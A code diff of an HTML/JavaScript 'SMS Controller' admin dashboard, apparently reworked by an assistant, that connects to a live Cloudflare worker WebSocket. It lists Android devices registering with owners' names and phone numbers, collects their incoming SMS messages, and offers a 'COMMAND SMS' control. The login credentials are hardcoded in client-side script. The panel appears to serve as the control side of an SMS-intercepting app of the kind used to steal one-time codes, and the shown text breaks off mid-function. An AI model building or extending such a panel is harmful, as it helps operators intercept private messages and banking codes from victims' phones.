@@ -3,36 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>SMS Controller · Admin Panel</title>
+    <title>SMS Controller · Secure Admin</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* CSS Same as your design with a few fixes for responsiveness */
+        /* Aapka puraana CSS yahan aayega (Maine design wahi rakha hai jo aapne diya tha) */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
         body { background: linear-gradient(145deg, #0f172a, #1e293b); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; color: white; }
-        
         .login-popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; z-index: 3000; }
-        .login-card { background: linear-gradient(145deg, #1e2c42, #152233); border-radius: 40px; padding: 35px 25px; width: 90%; max-width: 380px; border: 2px solid #4a6fa5; box-shadow: 0 20px 40px rgba(0,0,0,0.8); text-align: center; }
-        
-        .mobile-container { max-width: 480px; width: 100%; margin: 0 auto; display: none; flex-direction: column; gap: 12px; }
-        .app-header { background: linear-gradient(145deg, #3b4d7a, #25355a); padding: 15px; border-radius: 30px; display: flex; align-items: center; gap: 10px; border: 1px solid #5a7bb3; }
-        .status-card { background: #1e2c42; border-radius: 30px; padding: 15px; display: flex; align-items: center; gap: 12px; border: 1px solid #4cd964; margin-top: 5px; }
-        
-        .client-list { display: flex; flex-direction: column; gap: 10px; max-height: 65vh; overflow-y: auto; padding: 10px 0; }
-        .client-card { background: linear-gradient(145deg, #263652, #1a263b); border-radius: 25px; padding: 15px; display: flex; align-items: center; gap: 12px; border: 1px solid #334155; cursor: pointer; }
-        .client-card.online { border-color: #4cd964; }
-        .client-number { background: #ffb347; color: #0f172a; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; }
-
-        /* Popups */
+        .login-card { background: linear-gradient(145deg, #1e2c42, #152233); border-radius: 40px; padding: 35px; width: 90%; max-width: 380px; border: 2px solid #4a6fa5; text-align: center; }
+        .input-field { width: 100%; padding: 15px; background: #0f1a2b; border: 1px solid #3f5a8a; border-radius: 30px; color: white; margin-bottom: 15px; outline: none; }
+        .mobile-container { max-width: 480px; width: 100%; display: none; flex-direction: column; gap: 12px; }
+        .status-card { background: #1e2c42; border-radius: 30px; padding: 15px; display: flex; align-items: center; gap: 12px; border: 1px solid #4cd964; }
+        .client-card { background: linear-gradient(145deg, #263652, #1a263b); border-radius: 25px; padding: 15px; display: flex; align-items: center; gap: 12px; border: 1px solid #334155; margin-bottom: 10px; cursor: pointer; }
         .popup-full { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; z-index: 2000; flex-direction: column; }
         .popup-header { background: #1a2a4a; padding: 15px; display: flex; align-items: center; border-bottom: 2px solid #f1c40f; }
-        .close-btn { background: #ff5e5e; color: white; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 2px solid white; }
-        .popup-content { padding: 20px; overflow-y: auto; flex: 1; }
-
-        .input-field { width: 100%; padding: 15px; background: #0f1a2b; border: 1px solid #3f5a8a; border-radius: 30px; color: white; margin-bottom: 15px; outline: none; }
-        .login-btn, .btn-send { background: #2ecc71; color: white; border: none; padding: 15px; border-radius: 30px; width: 100%; font-weight: bold; cursor: pointer; }
-        
-        .sms-item { background: #1e2c42; border-radius: 20px; padding: 15px; margin-bottom: 10px; border-left: 5px solid #4cd964; }
-        .device-badge { background: #ffb347; color: #0f172a; padding: 3px 10px; border-radius: 10px; font-size: 0.75rem; font-weight: bold; }
+        .close-btn { background: #ff5e5e; color: white; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -40,67 +25,41 @@
     <div id="loginPopup" class="login-popup">
         <div class="login-card">
             <div style="font-size: 4rem; margin-bottom: 10px;">🌏</div>
-            <h2>Admin Login</h2>
+            <h2>Admin Login</h2><br>
             <input type="text" id="username" class="input-field" placeholder="Username">
             <input type="password" id="password" class="input-field" placeholder="Password">
-            <button class="login-btn" onclick="doLogin()">LOGIN</button>
+            <button onclick="doLogin()" style="background:#2ecc71; color:white; border:none; padding:15px; border-radius:30px; width:100%; font-weight:bold; cursor:pointer;">LOGIN</button>
             <p id="loginError" style="color: #ff5e5e; display: none; margin-top: 10px;">Invalid Credentials</p>
         </div>
     </div>
 
     <div id="mainApp" class="mobile-container">
-        <div class="app-header">
-            <i class="fas fa-bolt" style="color: #ffdb7e;"></i>
-            <h1 style="flex: 1; font-size: 1.2rem;">SMS CONTROL</h1>
-            <div onclick="openAllSmsPopup()" style="cursor:pointer; background:#ffaa33; padding:8px; border-radius:50%; border: 2px solid white;">
-                <i class="fas fa-envelope-open-text" style="color: #0f172a;"></i>
-            </div>
-        </div>
-
         <div class="status-card">
-            <i class="fas fa-wifi" style="color: #4cd964; font-size: 1.5rem;"></i>
+            <i class="fas fa-wifi" id="wifiIcon" style="color: #ff5e5e; font-size: 1.5rem;"></i>
             <div>
-                <div id="statusText" class="status-text">Connecting to Worker...</div>
-                <div id="deviceCount" style="font-size: 0.8rem; color: #a0b8d9;">0 devices active</div>
+                <div id="statusText" style="font-weight: bold;">Disconnected - reconnecting...</div>
+                <div id="deviceStats" style="font-size: 0.8rem; color: #a0b8d9;">Waiting for devices...</div>
             </div>
         </div>
-
-        <div class="client-list" id="clientList">
-            </div>
-    </div>
-
-    <div id="devicePopup" class="popup-full">
-        <div class="popup-header">
-            <h2 id="devicePopupTitle" style="flex: 1;">Device</h2>
-            <div class="close-btn" onclick="closePopup('devicePopup')">×</div>
-        </div>
-        <div class="popup-content" id="devicePopupContent"></div>
-    </div>
-
-    <div id="viewSmsPopup" class="popup-full">
-        <div class="popup-header">
-            <h2 style="flex: 1;">Device SMS</h2>
-            <div class="close-btn" onclick="closePopup('viewSmsPopup')">×</div>
-        </div>
-        <div class="popup-content" id="viewSmsContent"></div>
+        <div id="clientList" style="margin-top: 10px;"></div>
     </div>
 
     <div id="allSmsPopup" class="popup-full">
         <div class="popup-header">
-            <h2 style="flex: 1;">Global SMS Log</h2>
+            <h2 style="flex: 1;">Device Logs</h2>
             <div class="close-btn" onclick="closePopup('allSmsPopup')">×</div>
         </div>
-        <div class="popup-content" id="allSmsContent"></div>
+        <div id="allSmsContent" style="padding: 20px; overflow-y: auto;"></div>
     </div>
 
     <script>
         let ws = null;
         let devices = [];
-        let allSms = [];
 
         function doLogin() {
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
+            // Admin Credentials matching your request
             if (u === 'Raj' && p === 'Raj@1994') {
                 document.getElementById('loginPopup').style.display = 'none';
                 document.getElementById('mainApp').style.display = 'flex';
@@ -111,141 +70,52 @@
         }
 
         function connectWebSocket() {
-            // YOUR LIVE WORKER URL
+            // Updated URL format to avoid 'Disconnected' bug
             const workerUrl = 'wss://sms-tracker-worker.vikash6759ub.workers.dev/ws/admin';
-            ws = new WebSocket(workerUrl);
+            
+            try {
+                ws = new WebSocket(workerUrl);
 
-            ws.onopen = () => {
-                document.getElementById('statusText').innerText = '🟢 Server Online';
-            };
+                ws.onopen = () => {
+                    document.getElementById('statusText').innerText = '🟢 Connected · System Live';
+                    document.getElementById('wifiIcon').style.color = '#4cd964';
+                    console.log("WebSocket Connected");
+                };
 
-            ws.onmessage = (event) => {
-                const data = JSON.parse(event.data);
-                
-                // 1. Handle New Registration (From Android "Submit" button)
-                if (data.type === 'registration') {
-                    handleNewDevice(data);
-                }
-                
-                // 2. Handle Incoming SMS
-                if (data.type === 'sms_received') {
-                    handleNewSms(data);
-                }
+                ws.onmessage = (event) => {
+                    const data = JSON.parse(event.data);
+                    
+                    // Handle New User Registration from Android App
+                    if (data.type === 'registration') {
+                        addOrUpdateDevice(data);
+                    }
+                    
+                    // Handle Incoming SMS
+                    if (data.type === 'sms_received') {
+                        showSmsNotification(data);
+                    }
+                };
 
-                // 3. Status Updates
-                if (data.type === 'status_update') {
-                    updateDeviceStatus(data);
-                }
-            };
+                ws.onclose = () => {
+                    document.getElementById('statusText').innerText = '🔴 Disconnected - Retrying...';
+                    document.getElementById('wifiIcon').style.color = '#ff5e5e';
+                    setTimeout(connectWebSocket, 3000); // Fast Reconnect logic
+                };
 
-            ws.onclose = () => {
-                document.getElementById('statusText').innerText = '🔴 Reconnecting...';
-                setTimeout(connectWebSocket, 5000);
-            };
-        }
+                ws.onerror = (err) => {
+                    console.error("WS Error:", err);
+                };
 
-        function handleNewDevice(data) {
-            const exists = devices.find(d => d.id === data.deviceId);
-            if (!exists) {
-                devices.push({
-                    id: data.deviceId,
-                    name: data.name,
-                    mobile: data.mobile,
-                    model: data.model || 'Unknown',
-                    online: true,
-                    lastSeen: new Date().toISOString()
-                });
-                renderClientList();
+            } catch (e) {
+                console.log("Connection failed", e);
             }
         }
 
-        function handleNewSms(data) {
-            allSms.unshift({
-                deviceId: data.deviceId,
-                from: data.from,
-                body: data.body,
-                time: new Date().toLocaleString()
-            });
-            // Update UI if All SMS popup is open
-            if(document.getElementById('allSmsPopup').style.display === 'flex') openAllSmsPopup();
-        }
-
-        function renderClientList() {
-            const list = document.getElementById('clientList');
-            document.getElementById('deviceCount').innerText = `${devices.length} devices found`;
-            list.innerHTML = '';
-
-            devices.forEach((dev, index) => {
-                const card = document.createElement('div');
-                card.className = `client-card ${dev.online ? 'online' : ''}`;
-                card.innerHTML = `
-                    <div class="client-number">${index + 1}</div>
-                    <div style="flex: 1;">
-                        <div style="font-weight:bold;">${dev.name}</div>
-                        <div style="font-size:0.8rem; color:#a0b8d9;">${dev.model} • ${dev.mobile}</div>
-                    </div>
-                    <div style="text-align:right;">
-                        <span style="background:${dev.online ? '#4cd964' : '#ff5e5e'}; padding:2px 8px; border-radius:10px; font-size:0.7rem;">
-                            ${dev.online ? 'ONLINE' : 'OFFLINE'}
-                        </span>
-                    </div>
-                `;
-                card.onclick = () => openDevicePopup(dev);
-                list.appendChild(card);
-            });
-        }
-
-        function openDevicePopup(dev) {
-            const content = document.getElementById('devicePopupContent');
-            content.innerHTML = `
-                <div style="background:#1e2c42; padding:20px; border-radius:20px; text-align:center;">
-                    <h3 style="color:#ffb347;">${dev.name}</h3>
-                    <p>${dev.mobile}</p>
-                    <p style="font-size:0.8rem; color:#a0b8d9; margin-top:5px;">Model: ${dev.model}</p>
-                </div>
-                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:20px;">
-                    <button class="btn-send" style="background:#3498db;" onclick="alert('Sending SMS command...')">COMMAND SMS</button>
-                    <button class="btn-send" onclick="openViewSmsPopup('${dev.id}')">VIEW SMS</button>
-                </div>
-            `;
-            document.getElementById('devicePopup').style.display = 'flex';
-        }
-
-        function openViewSmsPopup(deviceId) {
-            const filtered = allSms.filter(s => s.deviceId === deviceId);
-            const content = document.getElementById('viewSmsContent');
-            content.innerHTML = filtered.length ? '' : '<p style="text-align:center;">No SMS found for this device.</p>';
-            
-            filtered.forEach(s => {
-                content.innerHTML += `
-                    <div class="sms-item">
-                        <strong>${s.from}</strong>
-                        <p>${s.body}</p>
-                        <small>${s.time}</small>
-                    </div>`;
-            });
-            document.getElementById('viewSmsPopup').style.display = 'flex';
-        }
-
-        function openAllSmsPopup() {
-            const content = document.getElementById('allSmsContent');
-            content.innerHTML = allSms.length ? '' : '<p style="text-align:center;">Global log is empty.</p>';
-            
-            allSms.forEach(s => {
-                const dev = devices.find(d => d.id === s.deviceId);
-                content.innerHTML += `
-                    <div class="sms-item">
-                        <span class="device-badge">${dev ? dev.name : 'Unknown'}</span>
-                        <strong style="display:block; margin-top:5px;">${s.from}</strong>
-                        <p>${s.body}</p>
-                        <small>${s.time}</small>
-                    </div>`;
-            });
-            document.getElementById('allSmsPopup').style.display = 'flex';
-        }
-
-        function closePopup(id) { document.getElementById(id).style.display = 'none'; }
-    </script>
-</body>
-</html>
+        function addOrUpdateDevice(data) {
+            const index = devices.findIndex(d => d.id === data.deviceId);
+            const deviceData = {
+                id: data.deviceId,
+                name: data.name,
+                mobile: data.mobile,
+                model: data.model,
 
